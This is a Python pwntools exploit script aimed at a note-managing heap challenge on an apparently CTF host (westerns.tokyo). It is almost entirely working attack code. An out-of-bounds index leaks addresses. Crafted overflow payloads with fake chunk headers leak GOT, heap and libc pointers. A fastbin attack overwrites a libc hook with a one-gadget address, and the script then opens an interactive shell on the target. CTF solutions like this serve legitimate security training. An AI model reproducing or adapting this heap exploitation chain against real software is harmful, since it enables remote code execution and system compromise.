#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "pwn2.chal.ctf.westerns.tokyo"
port = 18554
r = remote(host,port)
def add(size,data):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil("note.")
    r.sendline(str(size))
    r.recvuntil("note.")
    r.sendline(data)

def show(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil("note.")
    r.sendline(str(idx))

def remove(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil("note.")
    r.sendline(str(idx))


context.arch = "amd64"
show(-11)
r.recvuntil("Content:")
bss = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 8
print "bss:",hex(bss) 
code = bss - 0x202000
buf = bss + 0x60
add(0x18,"a"*0x17)
add(128,"d"*127)
add(0x68,"b"*0x67)
remove(2)
remove(1)
remove(0)
payload = "a"*0x18 + p64(0x91) + p64(0) + p64(bss+0x70) + "d"*0x70 + p64(0x90) + p64(0x70) + p64(bss+0x3d)
add(0, payload)
puts_got = code + 0x201f90
add(128,p64(puts_got) + p64(puts_got) +"c"*0x57)
show(4)
r.recvuntil("Content:")
heap = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x120
print "heap:",hex(heap)
idx = ((heap+0x30) - buf)/8
show(idx)
r.recvuntil("Content:")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x6f690
print "libc:",hex(libc)
remove(0)
fake_addr = libc + 0x3c56bd
fake_addr = libc + 0x3c4afd
payload2 = "a"*0x18 + p64(0x91) + p64(0) + p64(bss+0x70) + "d"*0x70 + p64(0x90) + p64(0x70) + p64(fake_addr)
add(0,payload2)
magic = libc + 0xf0274
add(0x68,p64(heap+0x10)*12)
add(0x68,"\x00"*3 + p64(magic))
idx = ((heap+0xc0) -buf)/8
remove(idx)
remove(0)
r.interactive()
